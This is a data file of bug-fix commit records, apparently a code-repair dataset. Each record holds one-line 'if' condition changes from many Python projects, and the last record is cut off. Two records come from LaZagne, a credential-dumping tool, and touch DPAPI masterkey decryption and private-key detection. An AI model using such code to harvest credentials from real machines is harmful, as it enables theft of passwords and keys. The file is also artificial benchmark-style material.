{"project": "LaZagne", "commit_sha": "0af5f10f1411c38d7c2df3c61846cecd6702a274", "parent_sha": "951083578aefca201e8151ce4b5c04dcb0240bb3", "file_path": "Windows/lazagne/config/DPAPI/masterkey.py", "project_url": "https://github.com/rvrsh3ll/LaZagne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class MasterKey(DataStruct):\n-        if self.decrypted:\n+        if self.decrypted or not pwdhash:\n             return\n \n         # Compute encryption key\n", "before": "if self . decrypted : return", "after": "if self . decrypted or not pwdhash : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 9, 1, 19], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 0, 12, 0, 26], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:pwdhash\", \"T\"], 1]]"}
{"project": "LaZagne", "commit_sha": "430f9994860e27adf54a88ffdb999f133ba2fc6d", "parent_sha": "6eefd1dab6873338a7c24a7be2af08d67e23ae28", "file_path": "Windows/lazagne/softwares/sysadmin/opensshforwindows.py", "project_url": "https://github.com/rvrsh3ll/LaZagne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class OpenSSHForWindows(ModuleInfo):\n                             # Determine the type of the key (public/private) and what is it algorithm\n                             if \"DSA PRIVATE KEY\" in key_content_encoded:\n                                 key_algorithm = \"DSA\"\n-                            elif \"RSA PRIVATE KEY\" in key_content_encoded:\n+                            elif \"RSA PRIVATE KEY\" in key_content_encoded or \"OPENSSH PRIVATE KEY\" in key_content_encoded:\n                                 key_algorithm = \"RSA\"\n                             else:\n                                 key_algorithm = None\n", "before": "if \"DSA PRIVATE KEY\" in key_content_encoded : key_algorithm = \"DSA\" elif \"RSA PRIVATE KEY\" in key_content_encoded : key_algorithm = \"RSA\" else : key_algorithm = None", "after": "if \"DSA PRIVATE KEY\" in key_content_encoded : key_algorithm = \"DSA\" elif \"RSA PRIVATE KEY\" in key_content_encoded or \"OPENSSH PRIVATE KEY\" in key_content_encoded : key_algorithm = \"RSA\" else : key_algorithm = None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 29, 4, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 34, 3, 74], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"OPENSSH PRIVATE KEY\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:key_content_encoded\", \"T\"], 2]]"}
{"project": "twisted", "commit_sha": "15ed1ae4e037496b5d7e16f1e4ea31f17ef859c7", "parent_sha": "191a48f9b6400979683a696e560ad1970741f465", "file_path": "twisted/internet/protocol.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -212,7 +212,7 @@ class ReconnectingClientFactory(ClientFactory):\n     def clientConnectionFailed(self, connector, reason):\n         if self.continueTrying:\n             self.connector = connector\n-            if not reason.check(error.UserError):\n+            if not reason.check(error.UserError) or reason.check(TimeoutError):\n                 self.retry()\n \n     def clientConnectionLost(self, connector, unused_reason):\n", "before": "if not reason . check ( error . UserError ) : self . retry ( )", "after": "if not reason . check ( error . UserError ) or reason . check ( TimeoutError ) : self . retry ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 16, 3, 49], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 49], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:reason\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:check\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:TimeoutError\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "buildbot", "commit_sha": "46b64601449abb4238c3bd991c278da540ecd865", "parent_sha": "019ec87808ea08c57067ebf7ac8223e245598478", "file_path": "slave/buildslave/commands/git.py", "project_url": "https://github.com/longaccess/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class Git(SourceBaseCommand):\n             diffbranch = self.sourcedata != self.readSourcedata()\n         except IOError:\n             diffbranch = False\n-        if diffbranch:\n+        if diffbranch or self.sourcedirIsPatched():\n             command = ['clean', '-f', '-d']\n             if self.ignore_ignores:\n                 command.append('-x')\n", "before": "if diffbranch : command = [ 'clean' , '-f' , '-d' ] if self . ignore_ignores : command . append ( '-x' )", "after": "if diffbranch or self . sourcedirIsPatched ( ) : command = [ 'clean' , '-f' , '-d' ] if self . ignore_ignores : command . append ( '-x' )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 37], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:diffbranch\", 3, 12, 3, 22], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:sourcedirIsPatched\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"):)\", \"T\"], 1]]"}
{"project": "Products.LinguaPlone", "commit_sha": "b4d8da221ed796394eca57d22a96d2c27352d640", "parent_sha": "caef4de3512aaeebfa8fc185047959c931ddd66f", "file_path": "Products/LinguaPlone/browser/selector.py", "project_url": "https://github.com/makinacorpus/Products.LinguaPlone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class TranslatableLanguageSelector(LanguageSelector):\n         stop = False\n         while current_path and not stop:\n             check = current_path.pop()\n-            if check == 'VirtualHostRoot':\n+            if check == 'VirtualHostRoot' or check.startswith('_vh_'):\n                 # Just ignore the VirtualHostRoot path info. This looks\n                 # somewhat odd, but I couldn't figure out a way to use the\n                 # actual request API to give us what we need\n", "before": "if check == 'VirtualHostRoot' : ", "after": "if check == 'VirtualHostRoot' or check . startswith ( '_vh_' ) : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 3, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 42], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:check\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:startswith\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'_vh_'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "keystone", "commit_sha": "418a9e5913fe25fb4c5e704655d2497da3bc5d41", "parent_sha": "87f6faab6eeb1037de675b559436b53c35415675", "file_path": "keystone/middleware/url.py", "project_url": "https://github.com/promptworks/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,8 @@ class UrlRewriteFilter(object):\n         if ext in CONTENT_TYPES:\n             # Use the content type specified by the extension\n             return (path, CONTENT_TYPES[ext])\n-        elif http_accept is None:\n+        elif http_accept is None or http_accept == '*/*':\n+            # TODO: This probably isn't the best place to handle \"Accept: */*\"\n             # No extension or Accept header specified, use default\n             return (path_info, DEFAULT_CONTENT_TYPE)\n         else:\n", "before": "if ext in CONTENT_TYPES : return ( path , CONTENT_TYPES [ ext ] ) elif http_accept is None : return ( path_info , DEFAULT_CONTENT_TYPE ) else : ", "after": "if ext in CONTENT_TYPES : return ( path , CONTENT_TYPES [ ext ] ) elif http_accept is None or http_accept == '*/*' : return ( path_info , DEFAULT_CONTENT_TYPE ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 5, 53], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 14, 3, 33], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:http_accept\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'*/*'\", \"T\"], 2]]"}
{"project": "pyrollbar", "commit_sha": "b30ce9569d5699be6b9226bba5f1b0d6a166d8e3", "parent_sha": "d56a57bd51665d19282c4f9928bd09e24cfa957e", "file_path": "rollbar/__init__.py", "project_url": "https://github.com/KosyanMedia/pyrollbar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -689,7 +689,7 @@ def _add_locals_data(data, exc_info):\n \n             func = _get_func_from_frame(tb_frame)\n             if func:\n-                if inspect.ismethod(func):\n+                if inspect.isfunction(func) or inspect.ismethod(func):\n                     argspec = inspect.getargspec(func)\n                 elif inspect.isclass(func):\n                     init_func = getattr(func, '__init__', None)\n", "before": "if inspect . ismethod ( func ) : argspec = inspect . getargspec ( func ) elif inspect . isclass ( func ) : init_func = getattr ( func , '__init__' , None )", "after": "if inspect . isfunction ( func ) or inspect . ismethod ( func ) : argspec = inspect . getargspec ( func ) elif inspect . isclass ( func ) : init_func = getattr ( func , '__init__' , None )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 64], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 42], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:inspect\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:isfunction\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:func\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "easy-thumbnails", "commit_sha": "dc5b9d1f48fae2f7e4864fc4b919ef7e380496ad", "parent_sha": "abd6053c4c76b068c89975ae094c58c69239c567", "file_path": "easy_thumbnails/widgets.py", "project_url": "https://github.com/eldarion/easy-thumbnails", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class ImageClearableFileInput(ClearableFileInput):\n \n     def render(self, name, value, attrs=None):\n         output = super(ImageClearableFileInput, self).render(name, value, attrs)\n-        if not value:\n+        if not value or not hasattr(value, 'storage'):\n             return output\n         thumb = self.get_thumbnail(value)\n         substitution = {\n", "before": "if not value : return output", "after": "if not value or not hasattr ( value , 'storage' ) : return output", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 21], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:value\", 3, 16, 3, 21], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:value\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"string:'storage'\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4]]"}
{"project": "cclib", "commit_sha": "9ef544404a9e0f652f4b6cb20874d40cbb76f274", "parent_sha": "3a5322d87a10b228ad6586b51d92ffb6426c695b", "file_path": "src/cclib/parser/gaussianparser.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class Gaussian(logfileparser.Logfile):\n             if line[1:23] == \"Optimization completed\":\r\n                 optfinished = True\r\n             \r\n-            if line.find(\"Input orientation\") > -1:\r\n+            if line.find(\"Input orientation\") > -1 or line.find(\"Z-Matrix orientation\") > -1:\r\n # Extract the atomic numbers and coordinates in the event standard orientation isn't available\r\n \r\n                 if self.progress and random.random() < cupdate:\r\n", "before": "if line . find ( \"Input orientation\" ) > - 1 : if self . progress and random . random ( ) < cupdate : ", "after": "if line . find ( \"Input orientation\" ) > - 1 or line . find ( \"Z-Matrix orientation\" ) > - 1 : if self . progress and random . random ( ) < cupdate : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 64], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 51], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"unary_operator\", \"N3\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N3\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:line\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:find\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"string:\\\"Z-Matrix orientation\\\"\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2]]"}
{"project": "meson", "commit_sha": "52a56d441a4d596f7633a364d01110ac4bb806ce", "parent_sha": "dcc95d7f705c5fbc036d7d6511f6df50beaac44a", "file_path": "mesonbuild/backend/backends.py", "project_url": "https://github.com/rindeal/meson", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class Backend:\n         for d in deps:\n             if not isinstance(d, (build.StaticLibrary, build.SharedLibrary)):\n                 raise RuntimeError('Tried to link with a non-library target \"%s\".' % d.get_basename())\n-            if isinstance(compiler, compilers.LLVMDCompiler):\n+            if isinstance(compiler, compilers.LLVMDCompiler) or isinstance(compiler, compilers.DmdDCompiler):\n                 args += ['-L' + self.get_target_filename_for_linking(d)]\n             else:\n                 args.append(self.get_target_filename_for_linking(d))\n", "before": "if isinstance ( compiler , compilers . LLVMDCompiler ) : args += [ '-L' + self . get_target_filename_for_linking ( d ) ] else : args . append ( self . get_target_filename_for_linking ( d ) )", "after": "if isinstance ( compiler , compilers . LLVMDCompiler ) or isinstance ( compiler , compilers . DmdDCompiler ) : args += [ '-L' + self . get_target_filename_for_linking ( d ) ] else : args . append ( self . get_target_filename_for_linking ( d ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 69], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 61], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:compiler\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:compilers\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:DmdDCompiler\", \"T\"], 2]]"}
{"project": "meson", "commit_sha": "f2256ba0980d1d5eb22b202dacc15abd9249339a", "parent_sha": "76d88259bde4e8d28d18c66c171fa6625d129a79", "file_path": "mesonbuild/interpreter.py", "project_url": "https://github.com/rindeal/meson", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1354,7 +1354,7 @@ class Interpreter():\n         if 'version' in kwargs:\n             pv = subi.project_version\n             wanted = kwargs['version']\n-            if not mesonlib.version_compare(pv, wanted):\n+            if pv == 'undefined' or not mesonlib.version_compare(pv, wanted):\n                 raise InterpreterException('Subproject %s version is %s but %s required.' % (dirname, pv, wanted))\n         self.active_projectname = current_active\n         mlog.log('\\nSubproject', mlog.bold(dirname), 'finished.')\n", "before": "if not mesonlib . version_compare ( pv , wanted ) : raise InterpreterException ( 'Subproject %s version is %s but %s required.' % ( dirname , pv , wanted ) )", "after": "if pv == 'undefined' or not mesonlib . version_compare ( pv , wanted ) : raise InterpreterException ( 'Subproject %s version is %s but %s required.' % ( dirname , pv , wanted ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 115], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 16, 3, 56], 2], [\"Insert\", \"N1\", [\"identifier:pv\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'undefined'\", \"T\"], 2]]"}
{"project": "meson", "commit_sha": "598997bdb59efa9fe9e72c02d33a350bb8c397bb", "parent_sha": "0143c32c7cd82872e42f57216bb94a26191f2824", "file_path": "mesonbuild/scripts/meson_install.py", "project_url": "https://github.com/rindeal/meson", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def do_install(datafilename):\n \n def install_subdirs(data):\n     for (src_dir, inst_dir, dst_dir) in data.install_subdirs:\n-        if src_dir.endswith('/'):\n+        if src_dir.endswith('/') or src_dir.endswith('\\\\'):\n             src_dir = src_dir[:-1]\n         src_prefix = os.path.join(src_dir, inst_dir)\n         print('Installing subdir %s to %s.' % (src_prefix, dst_dir))\n", "before": "if src_dir . endswith ( '/' ) : src_dir = src_dir [ : - 1 ]", "after": "if src_dir . endswith ( '/' ) or src_dir . endswith ( '\\\\' ) : src_dir = src_dir [ : - 1 ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 35], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 33], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:src_dir\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:endswith\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'\\\\\\\\'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "xonsh", "commit_sha": "8d8cac4e424263bbc8da83f29d75ffac385e0e13", "parent_sha": "9163c478c1d952b8f9d71133e9af8a35d40f46ec", "file_path": "xonsh/completer.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class Completer(object):\n         self.bash_complete_funcs = bcf = {}\n         for line in out.splitlines():\n             head, cmd = line.rsplit(' ', 1)\n-            if len(cmd) == 0:\n+            if len(cmd) == 0 or cmd == 'cd':\n                 continue\n             m = RE_DASHF.search(head)\n             if m is None:\n", "before": "if len ( cmd ) == 0 : continue", "after": "if len ( cmd ) == 0 or cmd == 'cd' : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 29], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:cmd\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'cd'\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "6bf2f1a4c1980a402631713a53268fa2da8d916a", "parent_sha": "1c5637e71a4565181064cc0e00dac36fb113bf08", "file_path": "lib/python/Components/ParentalControl.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class ParentalControl:\n \t\t\tself.serviceLevel.remove(service)\n \t\t\t\t\n \tdef isServicePlayable(self, service, callback):\n-\t\tif not config.ParentalControl.configured.value:\n+\t\tif not config.ParentalControl.configured.value or not config.ParentalControl.setuppinactive.value:\n \t\t\treturn True\n \t\t#print \"whitelist:\", self.whitelist\n \t\t#print \"blacklist:\", self.blacklist\n", "before": "if not config . ParentalControl . configured . value : return True", "after": "if not config . ParentalControl . configured . value or not config . ParentalControl . setuppinactive . value : return True", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 6, 3, 49], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 10, 3, 49], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:value\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:setuppinactive\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:config\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:ParentalControl\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "5fda2babfb51773ef584ede326aeb5ab84d1794b", "parent_sha": "11bd7aa871872379e474a79127d9362d7f199495", "file_path": "lib/python/Screens/EpgSelection.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -485,7 +485,7 @@ class EPGSelection(Screen, HelpableScreen):\n \t\t\tself.infoKeyPressed(True)\n \n \tdef prevBouquet(self):\n-\t\tif (self.type == EPG_TYPE_MULTI or self.type == EPG_TYPE_GRAPH) and self.bouquetChangeCB:\n+\t\tif (self.type == EPG_TYPE_MULTI or self.type == EPG_TYPE_GRAPH or self.type == EPG_TYPE_INFOBARGRAPH) and self.bouquetChangeCB:\n \t\t\tif self.type == EPG_TYPE_MULTI and not config.epgselection.multi_showbouquet.getValue() or self.type == EPG_TYPE_GRAPH and not config.epgselection.graph_showbouquet.getValue() or self.type == EPG_TYPE_INFOBARGRAPH:\n \t\t\t\tself['list'].instance.moveSelectionTo(0)\n \t\t\t\tself.bouquetChangeCB(-1, self)\n", "before": "if ( self . type == EPG_TYPE_MULTI or self . type == EPG_TYPE_GRAPH ) and self . bouquetChangeCB : if self . type == EPG_TYPE_MULTI and not config . epgselection . multi_showbouquet . getValue ( ) or self . type == EPG_TYPE_GRAPH and not config . epgselection . graph_showbouquet . getValue ( ) or self . type == EPG_TYPE_INFOBARGRAPH : self [ 'list' ] . instance . moveSelectionTo ( 0 ) self . bouquetChangeCB ( - 1 , self )", "after": "if ( self . type == EPG_TYPE_MULTI or self . type == EPG_TYPE_GRAPH or self . type == EPG_TYPE_INFOBARGRAPH ) and self . bouquetChangeCB : if self . type == EPG_TYPE_MULTI and not config . epgselection . multi_showbouquet . getValue ( ) or self . type == EPG_TYPE_GRAPH and not config . epgselection . graph_showbouquet . getValue ( ) or self . type == EPG_TYPE_INFOBARGRAPH : self [ 'list' ] . instance . moveSelectionTo ( 0 ) self . bouquetChangeCB ( - 1 , self )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 7, 3, 65], [\"boolean_operator\", 3, 7, 3, 65], 0], [\"Insert\", [\"boolean_operator\", 3, 7, 3, 65], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 7, 3, 65], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:EPG_TYPE_INFOBARGRAPH\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:type\", \"T\"], 2]]"}
{"project": "waterbutler", "commit_sha": "47d60654c4dffd1175ef692762bc81a04e67ed6c", "parent_sha": "e298b681348a96bd2834370fb6d742a357b6b442", "file_path": "waterbutler/s3/provider.py", "project_url": "https://github.com/kushG/waterbutler", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -191,7 +191,7 @@ class S3Provider(provider.BaseProvider):\n         ]\n \n         for content in getattr(obj, 'Contents', []):\n-            if not content.Key.text:\n+            if not content.Key.text or content.Key.text == path:\n                 continue\n \n             if content.Key.text.endswith('/'):\n", "before": "if not content . Key . text : continue", "after": "if not content . Key . text or content . Key . text == path : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 16, 3, 36], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 20, 3, 36], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:path\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:text\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:content\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:Key\", \"T\"], 2]]"}
{"project": "my.osmc", "commit_sha": "4c23205ac60f5b024a502d538fa5609da5fff8dc", "parent_sha": "0988e7a4e93ab55b63c688732f4e3e0261101a3c", "file_path": "script.module.osmcsetting.networking/resources/lib/networking_gui.py", "project_url": "https://github.com/osmc/my.osmc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -865,7 +865,7 @@ class networking_gui(xbmcgui.WindowXMLDialog):\n                 alias = item.getProperty('alias')\n                 #              'Connect With Device'            'No'     Pair and Connect'    'pair'\n                 selection = DIALOG.select(lang(32022) + ' ' + alias + '?', [lang(32055),lang(32056), lang(32057)])\n-                if selection == 0:\n+                if selection == -1 or selection == 0:\n                     return\n                 self.show_busy_dialogue()\n                 self.setFocusId(BLUETOOTH_DISCOVERY)\n", "before": "if selection == 0 : return", "after": "if selection == - 1 or selection == 0 : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 27], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 34], 2], [\"Insert\", \"N1\", [\"identifier:selection\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", 